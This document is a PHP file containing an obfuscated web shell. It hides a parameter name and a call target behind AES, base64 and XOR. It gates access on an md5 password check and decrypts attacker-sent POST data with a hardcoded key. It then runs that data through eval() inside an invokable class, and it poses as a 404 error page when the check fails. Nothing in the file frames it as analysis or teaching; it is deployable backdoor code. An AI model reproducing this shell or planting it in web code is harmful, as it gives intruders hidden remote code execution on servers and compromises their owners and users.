
<?php
$a = ${base64_decode(openssl_decrypt("Lgjy1GJq3i90SAn6+weefA==","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("MV5FHu+luRti7DJVAjt1+Q==","AES-128-ECB", "21232f297a57a5a7"))}[1];

//  1 is md5('admin'). You can have on your own.
if(md5($a)=='21232f297a57a5a743894a0e4a801fc3')
{
	session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
	$_SESSION['k']=$key;
	session_write_close();
	$post=file_get_contents("php://input");
	if(!extension_loaded('openssl'))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __invoke($p) {"/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/"."/*YmZiNDg4YWYwMDc5ZjMxNzA4MzFiZDRjYjQwNTI1ZGU=*/".eval($p)."//bfb488af0079f3170831bd4cb40525de";}};
	$t = base64_decode(openssl_decrypt("610rJwc5aQHmJs63GYrhl/xj0QeaOsffhQ8+ggzZHAM=","AES-128-ECB", "21232f297a57a5a7"))^base64_decode(openssl_decrypt("d4LuKXiH4SpLy8+HKMyMJI7R52ftwmwqPdBnqL3N7Pc=","AES-128-ECB", "21232f297a57a5a7"));
    @${'t'}(new C(),$params);
  
  
}
else{
	
	echo '<title>Error 404!!1</title><p align="center">404.Not Found</p>';

	header('HTTP/1.1 404 Not Found');
	http_response_code(404);
}
?>
